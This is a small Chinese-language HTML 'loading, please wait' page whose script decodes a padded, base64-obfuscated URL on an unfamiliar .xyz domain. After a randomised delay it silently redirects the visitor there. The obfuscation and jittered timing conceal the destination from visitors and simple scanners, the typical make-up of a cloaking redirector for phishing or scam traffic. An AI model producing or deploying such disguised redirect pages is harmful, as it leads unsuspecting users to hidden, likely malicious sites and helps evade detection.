<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>加载中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div>正在加载中，请稍等…</div>

  <script>
    // 混淆
    const token = "keuyaHR0cHM6Ly9kYW9oYW5nLnNhZmUtZGF0YS1hY2Nlc3MueHl6kzew";  // 替换
    const start = 4, end = 4;

    // 函数
    function go() {
      try {
        const base64 = token.slice(start, -end);
        const target = atob(base64);
        window.location.href = target;
      } catch (e) {
        console.log("异常终止：地址无效");
      }
    }

    // 时间这里
    setTimeout(go, 1000 + Math.random() * 500);
  </script>
</body>
</html>
